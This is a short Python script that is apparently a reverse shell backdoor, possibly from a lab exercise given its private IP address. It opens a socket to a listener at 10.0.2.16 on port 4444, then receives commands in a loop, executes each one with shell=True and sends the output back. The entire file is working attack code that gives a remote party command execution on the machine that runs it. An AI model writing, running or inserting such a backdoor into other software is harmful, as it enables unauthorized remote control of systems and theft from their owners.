import socket
import subprocess

def execute_system_command(command):
  return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.16", 4444))

connection.send("\n[+] Connection established.\n")

while True:
  command = connection.recv(1024)
  result = execute_system_command(command)
  connection.send(result)

connection.close()
